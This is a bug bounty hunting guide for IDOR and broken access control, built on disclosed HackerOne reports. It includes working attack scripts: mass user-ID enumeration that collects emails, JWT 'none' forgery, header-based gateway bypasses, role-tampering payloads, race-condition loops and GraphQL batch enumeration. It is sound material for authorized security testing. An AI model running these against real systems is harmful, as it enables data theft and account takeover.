# Hunt: IDOR & Broken Access Control

> **Skill Version:** 1.0  
> **Source:** Top 100 HackerOne Disclosed Reports  
> **Coverage:** IDOR, BAC, Privilege Escalation, Horizontal/Vertical Access Control, API Auth Bypass, JWT Abuse, GraphQL Auth, Mass Assignment, Cross-Tenant IDOR  
> **Last Updated:** 2026-05-08

---

## 1. Crown Jewel Targets

### 1.1 User Account Endpoints

| Target Pattern | Report | Program | Bounty | Technique |
|---|---|---|---|---|
| Secondary user assignment | [#415081](https://hackerone.com/reports/415081) | PayPal | $10,500 | Added secondary users from other accounts via `/businessmanage/users/api/v1/users` |
| Account deletion API | [#3154983](https://hackerone.com/reports/3154983) | Mozilla | — | IDOR in `/v1/account/destroy` — delete any SSO user via email param |
| User edit → ATO | [#915114](https://hackerone.com/reports/915114) | Automattic | — | Changed `id` in `/users/invite-user.php?id=` to leak email + takeover |
| Profile link modification | [#1661113](https://hackerone.com/reports/1661113) | Reddit | — | Swapped `username` param to modify any user's profile links |
| Email edit → ATO | [#950881](https://hackerone.com/reports/950881) | Automattic | — | IDOR when editing email leads to account takeover |
| Profile picture IDOR | [#2024284](https://hackerone.com/reports/2024284) | Glassdoor | — | Profile picture mechanism discloses other users' photos |
| Session expiry | [#56511](https://hackerone.com/reports/56511) | Shopify | $1,000 | Expire other users' sessions via ID manipulation |
| Delete email address | [#2382484](https://hackerone.com/reports/2382484) | Mozilla | — | IDOR on delete email address feature |

### 1.2 Financial/Payment Endpoints

| Target Pattern | Report | Program | Bounty | Technique |
|---|---|---|---|---|
| Payment data (no auth) | [#751577](https://hackerone.com/reports/751577) | Nord Security | — | Unauthenticated POST `/api/v1/orders` leaked payment data |
| Use other's credit card | [#391092](https://hackerone.com/reports/391092) | Yelp | — | IDOR at `/checkout/transaction_platform` to pay with others' cards |
| Link other's card | [#358143](https://hackerone.com/reports/358143) | Yelp | — | Link other users' credit cards to attacker account |
| Edit all cards | [#361984](https://hackerone.com/reports/361984) | Yelp | — | Edit credit card info + partial card disclosure |
| Price manipulation | [#1403176](https://hackerone.com/reports/1403176) | Acronis | — | Manipulate pricing via IDOR |
| Billing doc download | [#2207248](https://hackerone.com/reports/2207248) | Shopify | $5,000 | GraphQL `BillingDocumentDownload` and `BillDetails` IDOR |
| Coin purchase abuse | [#1213765](https://hackerone.com/reports/1213765) | Reddit | $500 | Manipulated `order_id` in PayPal coin purchase |
| Order info leak | [#544329](https://hackerone.com/reports/544329) | X/xAI | $289 | IDOR leaking order statistics |

### 1.3 Administrative Endpoints

| Target Pattern | Report | Program | Bounty | Technique |
|---|---|---|---|---|
| Campaign deletion | [#1969141](https://hackerone.com/reports/1969141) | HackerOne | — | Delete any campaign via GraphQL `campaign_id` |
| Private report access | [#2487889](https://hackerone.com/reports/2487889) | HackerOne | — | POST `/bugs.json` with `organization_id` + `text_query` |
| Mod logs access | [#1658418](https://hackerone.com/reports/1658418) | Reddit | $5,000 | Changed `subredditName` in GraphQL for any subreddit's mod logs |
| Copilot IDOR | [#2218334](https://hackerone.com/reports/2218334) | HackerOne | — | `DestroyLlmConversation` mutation found via JS monitoring |
| ML model exposure | [#2528293](https://hackerone.com/reports/2528293) | GitLab | $1,160 | IDOR exposing all ML models |
| Asset tagging | [#2633771](https://hackerone.com/reports/2633771) | HackerOne | — | `AddTagToAssets` GraphQL operation IDOR |

### 1.4 Data Export/Download Endpoints

| Target Pattern | Report | Program | Bounty | Technique |
|---|---|---|---|---|
| Document download | [#1626508](https://hackerone.com/reports/1626508) | US DoD | $500 | Unauth IDOR via `Download.aspx?id=` leaked soldier PII |
| Attachment download | [#668439](https://hackerone.com/reports/668439) | BCM Messenger | — | Download any attachment via IDOR |
| Private videos | [#186279](https://hackerone.com/reports/186279) | Pornhub | $1,500 | Private video disclosure via Android API |
| Non-public photos | [#1737943](https://hackerone.com/reports/1737943) | Flickr | — | Access non-public photos |
| Report download | [#1559739](https://hackerone.com/reports/1559739) | TikTok | $500 | IDOR in report download on ads.tiktok.com |

### 1.5 Messaging/Communication Endpoints

| Target Pattern | Report | Program | Bounty | Technique |
|---|---|---|---|---|
| Support tickets | [#1392630](https://hackerone.com/reports/1392630) | TikTok | $2,500 | View any user's support tickets on seller platform |
| Ticket deletion | [#1475520](https://hackerone.com/reports/1475520) | TikTok | — | Delete any ticket via `draft_order_id` |
| Message deletion | [#697412](https://hackerone.com/reports/697412) | Kindred/Unibet | — | Delete messages via `/mom-api/messages/` |
| Email reading | [#1784681](https://hackerone.com/reports/1784681) | Nextcloud | — | Read any emails on Nextcloud Mail |
| Comment manipulation | [#204292](https://hackerone.com/reports/204292) | Rockstar Games | — | Insert/delete comments as another user |

### 1.6 Multi-Tenant Endpoints

| Target Pattern | Report | Program | Bounty | Technique |
|---|---|---|---|---|
| Cross-tenant pixel rules | [#984965](https://hackerone.com/reports/984965) | TikTok | — | GraphQL `AddRulesToPixelEvents` across advertisers |
| Cross-tenant business | [#1063022](https://hackerone.com/reports/1063022) | Uber | — | Privilege escalation + invitation takeover across businesses |
| Cross-tenant write | [#1066203](https://hackerone.com/reports/1066203) | Stripe | — | GraphQL `UpdateAtlasApplicationPerson` cross-tenant |
| Scheduled data leak | [#3219944](https://hackerone.com/reports/3219944) | SingleStore | — | IDOR via `projectID` leaking to other accounts |
| Team data leak | [#2381816](https://hackerone.com/reports/2381816) | Tools for Humanity | $500 | GraphQL `FetchMemberships` leaking team data |

### 1.7 Internal/Microservice Endpoints

| Target Pattern | Report | Program | Bounty | Technique |
|---|---|---|---|---|
| Internal API users | [#349291](https://hackerone.com/reports/349291) | New Relic | $1,500 | IDOR via `internal_api` users endpoint |
| Dashboard filters | [#459443](https://hackerone.com/reports/459443) | New Relic | $2,500 | Modify any NR Insights dashboard filters via `internal_api` |
| Hardcoded endpoint | [#3085742](https://hackerone.com/reports/3085742) | Bykea | — | IDOR on in-app hardcoded zombie endpoint |
| Cashier session | [#1966006](https://hackerone.com/reports/1966006) | Unikrn | $3,000 | IDOR during session handshake in cashier subdomain |

---

## 2. Attack Surface Signals

### Endpoint Patterns That Signal IDOR

```
# REST patterns
/api/v1/users/{id}              /api/v1/orders/{order_id}
/api/v1/organizations/{org_id}  /download?id={file_id}
/api/v1/users/{id}/settings     /export?report_id={id}

# Query parameters
?user_id=12345    ?account_id=67890    ?draft_order_id=789
?order_id=ABC123  ?projectID=456       ?cardId=999

# GraphQL (look in JS bundles)
mutation DeleteCampaign($campaign_id: ID!)
mutation DestroyLlmConversation($id: ID!)
query BillingDocumentDownload($invoiceId: ID!)
mutation AddRulesToPixelEvents($pixelId: ID!)
```

### JavaScript File Mining

```bash
# Extract API routes from JS bundles
curl -s https://target.com/assets/main.js | grep -oP '"/(api|graphql|v[0-9])[^"]*"'

# Find GraphQL operations (HackerOne Copilot technique - Report #2218334)
curl -s https://target.com/assets/main.js | grep -oP 'operationName:"[^"]*"'

# Extract ID parameter names
curl -s https://target.com/assets/main.js | grep -oP '(user_id|account_id|org_id|order_id|team_id)\b'

# Monitor for new endpoints - diff JS bundles periodically
diff <(curl -s https://target.com/main.js) saved_main.js
```

### Response Signals

- Sequential integer IDs in JSON → enumerable
- UUIDv1 → extractable timestamp component
- `X-User-Id` / `X-Account-Id` / `X-Tenant-Id` headers → architecture leak
- Status code differences: 200 vs 403 vs 404 (404 means object existence check)
- Error messages: "This resource belongs to user X"

### JWT Analysis

```bash
echo "eyJ..." | cut -d. -f2 | base64 -d 2>/dev/null | jq .
# Look for: sub, user_id, org_id, tenant_id, role, is_admin, kid
```

### API Documentation Discovery

```
/swagger.json    /api-docs       /openapi.json    /graphql
/.well-known/    /api/v1/docs    /redoc
```

---

## 3. Step-by-Step Hunting Methodology

### 3.1 Reconnaissance & Endpoint Mapping

1. Spider the application with Burp Suite while authenticated
2. Download and analyze JS bundles for API routes and GraphQL queries
3. Check for API documentation (Swagger, OpenAPI, GraphQL introspection)
4. Monitor JS files over time for unreleased features
5. Map all endpoints accepting object references

```bash
# GraphQL introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name args { name } } } mutationType { fields { name args { name } } } } }"}'
```

### 3.2 Identifier Harvesting

Collect valid IDs from: public profiles, API responses, emails/notifications, URL patterns, error messages.

```python
import requests
session = requests.Session()
session.headers = {"Authorization": "Bearer YOUR_TOKEN"}
ids = set()
for page in range(1, 100):
    r = session.get(f"https://target.com/api/v1/users?page={page}")
    for user in r.json().get("users", []):
        ids.add(user["id"])
print(f"Harvested {len(ids)} user IDs")
```

### 3.3 Baseline Request Analysis

1. Capture a normal authorized request for a resource you own
2. Document: method, path, headers, body, auth mechanism
3. Note response structure and referenced IDs
4. Identify auth mechanism: cookie, JWT, API key, OAuth

### 3.4 Horizontal Privilege Escalation Testing

**Core technique — used in 70%+ of top 100 reports:**

1. Create two accounts (A and B)
2. Perform action as A, capture request
3. Replace A's object ID with B's ID
4. Send modified request still authenticated as A

```bash
# Reddit profile link modification (Report #1661113)
curl -X PUT https://oauth.reddit.com/api/v1/me/links \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"username":"VICTIM_USERNAME","links":[{"url":"https://evil.com"}]}'
```

### 3.5 Vertical Privilege Escalation Testing

1. Identify admin endpoints from JS files / API docs
2. Access admin endpoints with regular user session
3. Test role parameter tampering (`role=admin`, `is_admin=true`)

```bash
# Access mod logs as non-moderator (Report #1658418)
curl -X POST https://gql.reddit.com/ \
  -H "Authorization: Bearer REGULAR_USER_TOKEN" \
  -d '{"operationName":"ModLogs","variables":{"subredditName":"TARGET_SUBREDDIT"}}'
```

### 3.6 Cross-Tenant/Organization Testing

1. Create accounts in different orgs
2. Capture org-specific requests (contain `org_id`, `tenant_id`)
3. Swap organization identifiers while maintaining session
4. Test GraphQL mutations with cross-tenant IDs

### 3.7 Method & Content-Type Switching

```bash
# Try different HTTP methods (Report #2456603 - IBM)
GET /api/v1/users/123     # May have auth
PUT /api/v1/users/123     # May bypass route-level ACL
PATCH /api/v1/users/123   # Often overlooked

# Content-Type switching
# application/json → application/x-www-form-urlencoded
# Some WAFs only validate one Content-Type
```

### 3.8 Parameter Pollution & Mass Assignment

```bash
# Duplicate parameters
POST /api/update?user_id=YOUR_ID&user_id=VICTIM_ID

# Array injection
{"user_id": [YOUR_ID, VICTIM_ID]}

# Hidden field injection
{"name": "test", "role": "admin", "is_admin": true, "user_id": VICTIM_ID}
```

### 3.9 JWT & Token Manipulation

```python
import base64, json
token = "eyJ..."
header = json.loads(base64.b64decode(token.split('.')[0] + '=='))
payload = json.loads(base64.b64decode(token.split('.')[1] + '=='))
# Test: Change user_id/sub claim
# Test: Algorithm confusion (RS256 → HS256 → none)
# Test: kid header injection
# Test: Expired token reuse
```

### 3.10 GraphQL-Specific Testing

GraphQL appears in a disproportionate number of top reports (HackerOne, Shopify, Reddit, TikTok, Stripe).

```graphql
# Introspection
{ __schema { queryType { fields { name args { name } } } } }

# Batch queries for mass enumeration
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"}
]

# Alias-based enumeration
{ a: user(id: "1") { email } b: user(id: "2") { email } }
```

### 3.11 Impact Escalation & Chaining

- **Read** → What PII is exposed?
- **Write** → Can you modify victim profile/role?
- **Delete** → Destructive capability?
- **Chain** → IDOR → ATO, IDOR → Priv Esc, IDOR → Financial Fraud

### 3.12 Mass Impact Assessment

```python
import requests
s = requests.Session()
s.headers = {"Authorization": "Bearer ATTACKER_TOKEN"}
success = sum(1 for uid in range(1, 1001) 
              if s.get(f"https://target.com/api/v1/users/{uid}/profile").status_code == 200)
print(f"Accessible: {success}/1000 — {'MASS VULN' if success > 100 else 'Limited'}")
```

---

## 4. Object Reference Patterns & Test Cases

| Type | Pattern | Location | Test Strategy | Real Report |
|---|---|---|---|---|
| Sequential Integer | `/users/12345` | URL path, query param, POST body | Increment/decrement | PayPal #415081, HackerOne #2122671 |
| UUID | `/orgs/550e8400-...` | URL path, JSON body, GraphQL var | Harvest from responses | Uber #1063022 (locationUUID) |
| Username | `{"username":"victim"}` | POST body, query param | Replace with target username | Reddit #1661113 |
| Email | `{"email":"v@x.com"}` | POST body | Replace with target email | Mozilla #3154983 |
| Weak Hash | `/resource/{short_hash}` | URL path | Brute-force short hash space | Semrush #837400 |
| Slug | `/subreddit/{name}/modlogs` | URL path, GraphQL var | Replace with target name | Reddit #1658418 |
| Composite | `org_id` + `text_query` | JSON POST body | Change org_id | HackerOne #2487889 |
| GraphQL ID | `mutation($id: ID!)` | GraphQL variable | Swap with victim's object ID | HackerOne #2122671, #1969141 |

```bash
# Find sequential IDs in proxy logs
grep -oP '/(users|orders|tickets)/[0-9]+' burp.txt | sort -u

# Extract UUIDs
grep -oP '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' response.json

# Decode Base64 IDs
echo "MTIzNDU=" | base64 -d  # Reveals: 12345
```

## 5. Bypass Techniques

### 5.1 JWT Authentication Bypasses

| Technique | Description | How to Test |
|---|---|---|
| `none` algorithm | Set `alg: "none"` in JWT header, remove signature | `{"alg":"none","typ":"JWT"}` + payload + `.` |
| RS256→HS256 confusion | Sign with public key as HMAC secret | `jwt_tool token -X a -pk public.pem` |
| `kid` injection | Set `kid` to path traversal or SQL injection | `{"kid":"../../dev/null"}` → empty key |
| `jwk` injection | Embed attacker's key in JWT header | Add `jwk` with your public key |
| Expired token reuse | Backend doesn't validate `exp` claim | Replay tokens after expiry |
| Signature stripping | Remove signature entirely | Send `header.payload.` (trailing dot) |

```python
# JWT none algorithm attack
import base64, json
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.b64encode(json.dumps({"sub":"VICTIM_ID","role":"admin"}).encode()).rstrip(b'=')
token = f"{header.decode()}.{payload.decode()}."
```

### 5.2 API Gateway/Proxy Bypasses

```bash
# Direct backend access (bypassing gateway auth)
curl https://internal-api.target.com/v1/users/123

# Host header manipulation
curl https://api.target.com/v1/users/123 -H "Host: internal-api.target.com"

# Internal IP trust (Report #349291 - New Relic internal_api)
curl https://api.target.com/admin/users -H "X-Forwarded-For: 127.0.0.1"
curl https://api.target.com/admin/users -H "X-Real-IP: 10.0.0.1"

# Path-based bypass
/api/v1/users/123       → blocked
/api/v1/./users/123     → may bypass
/api/v1/users/123/      → trailing slash
/api/v1/users/123;.js   → semicolon bypass
```

### 5.3 Role-Based Access Control Bypasses

```bash
# Role parameter tampering
POST /api/users/update -d '{"user_id":"VICTIM","role":"admin"}'

# Admin flag injection in registration/update
{"is_admin": true}  {"admin": 1}  {"role_id": 1}  {"privileges": "all"}

# Path traversal to admin routes
/api/v1/users/../admin/users/123
/api/v1/../../admin/dashboard

# HTTP method override headers
X-HTTP-Method-Override: DELETE
X-Method-Override: PUT
```

### 5.4 Input Validation Bypasses

```bash
# Type juggling
{"user_id": "123"}  →  {"user_id": 123}  →  {"user_id": [123]}

# JSON vs form-data differences (Report #2456603 - IBM)
# Endpoint validates JSON but not form-encoded equivalent
Content-Type: application/x-www-form-urlencoded
user_id=VICTIM_ID&action=delete

# Null byte injection
/api/users/123%00.json

# Unicode normalization
/api/users/１２３  (fullwidth digits)

# Case sensitivity
/api/users/Admin  vs  /api/users/admin
```

### 5.5 Business Logic Bypasses

```bash
# Negative values (Reddit coin purchase - Report #1213765)
{"quantity": -1, "order_id": "EXISTING_ORDER"}

# Race conditions (TOCTOU)
# Send concurrent requests to exploit state transitions
for i in $(seq 1 10); do
  curl -X POST https://target.com/api/transfer -d '{"amount":100}' &
done
wait

# State machine abuse
# Cancel → re-activate → access deleted resources
# Free trial → paid conversion with manipulated plan_id
```

### 5.6 GraphQL Authorization Bypasses

```graphql
# Batch queries to bypass per-query rate limits
[
  {"query": "mutation { deleteUser(id: \"1\") { ok } }"},
  {"query": "mutation { deleteUser(id: \"2\") { ok } }"}
]

# Field-level access control gaps
query { user(id: "VICTIM") { 
  publicName  # allowed
  email       # should be restricted
  ssn         # should be restricted
} }

# Alias-based mass enumeration
query {
  a: user(id: "1") { email }
  b: user(id: "2") { email }
  c: user(id: "3") { email }
}

# Fragment abuse for hidden fields
fragment FullUser on User { email phone ssn creditCard }
query { user(id: "VICTIM") { ...FullUser } }

# Introspection when disabled — use clairvoyance tool
# https://github.com/nikitastupin/clairvoyance
```

---

## 6. Advanced Chains & Escalation

### 6.1 IDOR → Account Takeover

| Chain | Report Example | Technique |
|---|---|---|
| IDOR → email change → ATO | Automattic #915114, #950881 | Change victim email via IDOR, trigger password reset |
| IDOR → session theft → ATO | Starbucks #876300 | Steal PHPSESSID from alternate site sharing DB |
| IDOR → password reset → ATO | Vimeo #42587 | Access password reset endpoint with victim ID |
| IDOR → API token theft → ATO | Automattic #1695454 | View any API token via IDOR, use for full access |
| IDOR → account deletion | Mozilla #3154983 | Delete victim account via email param |
| IDOR → session expiry | Shopify #56511 | Expire victim sessions = denial of service |

**Pattern:** The most reliable IDOR→ATO chain is: find IDOR on email update endpoint → change victim email to attacker email → trigger password reset → full account takeover without interaction.

### 6.2 IDOR → Privilege Escalation

| Chain | Report Example | Technique |
|---|---|---|
| IDOR → admin user creation | PayPal #415081 | Add secondary admin users to victim business account |
| IDOR → role modification | MTN #1448550 | Remove owners from teams + take control |
| IDOR → cross-tenant escalation | Uber #1063022 | Cross-tenant IDOR → edit other businesses' employees |
| IDOR → org ownership | Stripe #1066203 | GraphQL cross-tenant write on `UpdateAtlasApplicationPerson` |

### 6.3 IDOR → Mass Data Exfiltration

| Chain | Report Example | Technique |
|---|---|---|
| IDOR → bulk PII leak | Unikrn #1966006 | Enumerate user emails + phones via cashier |
| IDOR → export abuse | HackerOne #510759 | CSV export IDOR reveals custom field IDs across programs |
| IDOR → payment data dump | Nord Security #751577 | Unauthenticated endpoint exposes all payment data |
| IDOR → document download | US DoD #1626508 | Enumerate `Download.aspx?id=` for mass PII of soldiers |
| IDOR → GraphQL enumeration | Reddit #1658418 | Enumerate all subreddit mod logs via GraphQL |

### 6.4 IDOR → Financial Fraud

| Chain | Report Example | Technique |
|---|---|---|
| IDOR → credit card abuse | Yelp #391092 | Order food using other users' credit cards |
| IDOR → price manipulation | Acronis #1403176 | Manipulate pricing via IDOR |
| IDOR → underpayment | Reddit #1213765 | Manipulate `order_id` to pay less for coins |
| IDOR → card linking | Yelp #358143 | Link victim credit cards to attacker account |
| IDOR → fund transfer | Starbucks #766437 | Transfer funds from victim's Starbucks card |
| IDOR → reservation cancel | Yelp #2944357 | Cancel other users' reservations |

### 6.5 IDOR → RCE (via admin access)

| Chain | Technique |
|---|---|
| IDOR → admin panel → file upload → webshell | Access admin file upload via IDOR, upload PHP/JSP shell |
| IDOR → config modification → code execution | Modify app config to inject malicious code paths |
| IDOR → internal service exposure → SSRF → RCE | Access internal admin → SSRF to cloud metadata → credentials → RCE |
| Multi-vuln chain | Report #404874: RCE + SQLi + IDOR + Auth Bypass + XSS on single target |

### 6.6 IDOR → Stored XSS

| Chain | Report Example | Technique |
|---|---|---|
| IDOR → profile write → XSS | Reddit #1661113 | Modify other users' profile links with XSS payload |
| IDOR → comment injection | Rockstar #204292 | Insert comments as another user with XSS |
| IDOR → blog edit → XSS | Automattic #974222 | Edit anyone's blog/website content |
| IDOR → newsletter content | X/xAI #1096560 | Add arbitrary images/descriptions to others' issues |

---

## 7. Tooling & Automation

### 7.1 Burp Suite Extensions

| Extension | Purpose | Usage |
|---|---|---|
| **Autorize** | Automated auth testing | Configure low-priv session → browse as admin → auto-replays with low-priv token |
| **AuthMatrix** | Matrix-based role testing | Map roles × endpoints, test all combinations |
| **AutoRepeater** | Auto-replay with modifications | Duplicate requests with swapped IDs/tokens |
| **ParamMiner** | Hidden parameter discovery | Discover undocumented params like `is_admin`, `role` |
| **JWT Editor** | JWT manipulation | Decode, edit claims, test algorithm confusion |
| **InQL** | GraphQL introspection | Map GraphQL schema, generate queries |
| **Logger++** | Enhanced logging | Filter/search for specific ID patterns in traffic |

### 7.2 CLI Tools

```bash
# Endpoint fuzzing
ffuf -u https://target.com/api/v1/FUZZ -w api-endpoints.txt -mc 200,403

# Parameter fuzzing
arjun -u https://target.com/api/v1/users/123 --get

# ID enumeration
ffuf -u https://target.com/api/v1/users/FUZZ/profile -w <(seq 1 10000) -mc 200 -fc 403,404

# GraphQL introspection
python3 -m inql -t https://target.com/graphql

# Schema reconstruction (when introspection disabled)
clairvoyance https://target.com/graphql -o schema.json
```

### 7.3 Custom Scripts

```python
# Mass IDOR tester
import requests, concurrent.futures

TARGET = "https://target.com/api/v1/users/{}/profile"
ATTACKER_TOKEN = "Bearer eyJ..."
RESULTS = []

def test_id(uid):
    r = requests.get(TARGET.format(uid), 
                     headers={"Authorization": ATTACKER_TOKEN})
    if r.status_code == 200:
        data = r.json()
        RESULTS.append({"id": uid, "email": data.get("email"), "name": data.get("name")})
        return True
    return False

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = {executor.submit(test_id, i): i for i in range(1, 10001)}
    for f in concurrent.futures.as_completed(futures):
        pass

print(f"Found {len(RESULTS)} accessible profiles")
```

```python
# GraphQL IDOR batch tester
import requests, json

url = "https://target.com/graphql"
headers = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}

# Generate batch of queries using aliases
queries = []
for i in range(1, 101):
    queries.append(f'u{i}: user(id: "{i}") {{ email name }}')

batch_query = "query { " + " ".join(queries) + " }"
r = requests.post(url, headers=headers, json={"query": batch_query})
print(json.dumps(r.json(), indent=2))
```

### 7.4 ID Wordlists & Generators

```bash
# Sequential integer ranges
seq 1 100000 > ids_sequential.txt

# UUID v4 generator (for fuzzing)
python3 -c "import uuid; [print(uuid.uuid4()) for _ in range(1000)]" > uuids.txt

# Common admin user IDs
echo -e "1\n0\nadmin\nroot\nsuperadmin\nowner" > admin_ids.txt

# Common slug patterns
echo -e "admin\ntest\ndemo\ndefault\nroot\nsystem" > slugs.txt
```

### 7.5 Automation Strategies

1. **Systematic endpoint testing**: Export all endpoints from Burp sitemap → test each with swapped IDs
2. **Response diffing**: Compare response with own ID vs other ID — same structure = IDOR
3. **Status code analysis**: 200 with different data = confirmed IDOR; 403 = auth check exists; 404 = object validation
4. **Autorize workflow**: Browse entire app as admin with Autorize running low-priv session → review flagged endpoints
5. **CI/CD integration**: Run access control tests on every deployment using custom scripts

---

## 8. Gate 0 Validation Checklist

Before submitting any IDOR/BAC report:

- [ ] **Confirmed unauthorized access** to another user's data/action
- [ ] **Identified the exact missing check** (ownership validation, role check, tenant isolation)
- [ ] **Tested with secondary account** to confirm horizontal/vertical scope
- [ ] **Determined mass-exploitability** (affects 1 user vs all users)
- [ ] **Documented business impact** (PII exposure, financial, admin access, data destruction)
- [ ] **Checked for duplicate reports** on same program/endpoint
- [ ] **Prepared minimal PoC** with clear reproduction steps
- [ ] **Verified safe testing** — no data permanently modified or deleted
- [ ] **Distinguished IDOR vs BAC** — IDOR = object reference manipulation; BAC = missing function-level access control
- [ ] **Assessed chaining potential** — can this lead to ATO, privilege escalation, or mass data exfiltration?
- [ ] **Documented scope** — which HTTP methods are vulnerable (GET/POST/PUT/DELETE)?
- [ ] **Included remediation guidance** — what authorization check should be added?

---

## 9. Report References Index

| Rank | Program | Bounty | Technique | Privilege Type | Upvotes | Link |
|---|---|---|---|---|---|---|
| 1 | PayPal | $10,500 | Add secondary users via API IDOR | Cross-Account | 778 | [#415081](https://hackerone.com/reports/415081) |
| 2 | Nord Security | $0 | Unauthenticated payment data access | Unauthenticated | 383 | [#751577](https://hackerone.com/reports/751577) |
| 3 | HackerOne | $12,500 | Delete certifications via GraphQL ID swap | Horizontal | 378 | [#2122671](https://hackerone.com/reports/2122671) |
| 4 | HackerOne | $0 | Delete campaigns via GraphQL | Horizontal | 342 | [#1969141](https://hackerone.com/reports/1969141) |
| 5 | Pornhub | $1,500 | Delete photos/albums from gallery | Horizontal | 266 | [#380410](https://hackerone.com/reports/380410) |
| 6 | Starbucks | $0 | ATO via shared session cookie | Cross-Domain | 257 | [#876300](https://hackerone.com/reports/876300) |
| 7 | Pornhub | $1,500 | Edit other users' videos | Horizontal | 248 | [#681473](https://hackerone.com/reports/681473) |
| 8 | HackerOne | $0 | Private report access via /bugs.json | Vertical | 248 | [#2487889](https://hackerone.com/reports/2487889) |
| 9 | Mozilla | $0 | Account deletion via session misbinding | Horizontal | 231 | [#3154983](https://hackerone.com/reports/3154983) |
| 10 | Unikrn | $3,000 | PII disclosure via cashier IDOR | Horizontal | 226 | [#1966006](https://hackerone.com/reports/1966006) |
| 11 | TikTok | $0 | Delete tickets via draft_order_id | Horizontal | 214 | [#1475520](https://hackerone.com/reports/1475520) |
| 12 | Yelp | $0 | Order with other users' credit cards | Horizontal | 212 | [#391092](https://hackerone.com/reports/391092) |
| 13 | HackerOne | $0 | Unreleased Copilot feature IDOR via JS monitoring | Horizontal | 203 | [#2218334](https://hackerone.com/reports/2218334) |
| 14 | Reddit | $0 | Modify any user's profile links | Horizontal | 201 | [#1661113](https://hackerone.com/reports/1661113) |
| 15 | Automattic | $0 | Edit user → email disclosure → ATO | Horizontal→ATO | 199 | [#915114](https://hackerone.com/reports/915114) |
| 16 | Shopify | $5,000 | GraphQL BillingDocumentDownload IDOR | Cross-Tenant | 175 | [#2207248](https://hackerone.com/reports/2207248) |
| 17 | Automattic | $0 | Edit anyone's blogs/websites | Horizontal | 175 | [#974222](https://hackerone.com/reports/974222) |
| 18 | Semrush | $0 | Weak hash function in marketplace | Horizontal | 170 | [#837400](https://hackerone.com/reports/837400) |
| 19 | HackerOne | $0 | AddTagToAssets GraphQL IDOR | Horizontal | 167 | [#2633771](https://hackerone.com/reports/2633771) |
| 20 | Reddit | $5,000 | Mod logs via GraphQL subredditName swap | Vertical | 153 | [#1658418](https://hackerone.com/reports/1658418) |

---

## Appendix: Pattern Taxonomy

### Recurring Attack Surfaces (from 100 reports)

1. **GraphQL mutations** — #1 source of IDOR in modern apps (HackerOne, Shopify, Reddit, TikTok, Stripe)
2. **User management endpoints** — edit, delete, invite (PayPal, Automattic, Mozilla, MTN)
3. **Financial/order endpoints** — payment, checkout, billing (Yelp, Nord Security, Shopify, Reddit)
4. **Content management** — photos, videos, blogs, comments (Pornhub, Automattic, Reddit, Rockstar)
5. **Support/ticketing** — ticket view, delete (TikTok, Mail.ru, Kindred)
6. **Export/download** — documents, attachments, CSV (US DoD, HackerOne, BCM, TikTok)
7. **Admin/moderation** — logs, settings, campaigns (Reddit, HackerOne, New Relic)

### Technique Families

| Family | % of Top 100 | Key Examples |
|---|---|---|
| Sequential ID Enumeration | ~40% | PayPal, CrowdSignal, TikTok, US DoD |
| GraphQL ID Swap | ~20% | HackerOne, Shopify, Reddit, TikTok, Stripe |
| Username/Email as Identifier | ~10% | Reddit, Mozilla, Nextcloud |
| UUID Manipulation | ~8% | Uber, Starbucks |
| Session/Cookie Abuse | ~5% | Starbucks, Unikrn |
| Weak Hash/Encoding | ~5% | Semrush |
| No Auth Required | ~5% | Nord Security, US DoD |
| Cross-Tenant ID Swap | ~7% | TikTok, Uber, Stripe, SingleStore |

### Privilege Escalation Evolution

```
Level 1: Simple ID swap (change id=1 to id=2)
    ↓
Level 2: Cross-role access (regular user → admin endpoint)
    ↓
Level 3: Cross-tenant/org access (swap org_id/tenant_id)
    ↓
Level 4: Chain with ATO (IDOR → email change → password reset)
    ↓
Level 5: Mass exfiltration (enumerate all users/data)
    ↓
Level 6: Full compromise (IDOR → admin → file upload → RCE)
```

### Defense Layer vs Bypass Matrix

| Defense | Bypass Method | Report Reference |
|---|---|---|
| JWT verification | Algorithm confusion, kid injection | General pattern |
| Role-based access | Role param tampering, admin flag injection | Multiple |
| API Gateway auth | Direct backend access, internal_api paths | New Relic #349291 |
| Object ownership check | Missing on specific HTTP methods | IBM #2456603 |
| Sequential ID protection (UUID) | UUIDv1 timestamp extraction, harvest from responses | Uber #254151 |
| GraphQL auth | Mutation-level auth gaps, batch queries | HackerOne #2122671, #1969141 |
| Session validation | Session misbinding, cross-domain cookie reuse | Mozilla #3154983, Starbucks #876300 |
| Hash-based IDs | Short hash brute-force | Semrush #837400 |
| Content-Type validation | JSON↔form-data switching | IBM #2456603 |
| Rate limiting | Batch GraphQL queries, distributed requests | General pattern |
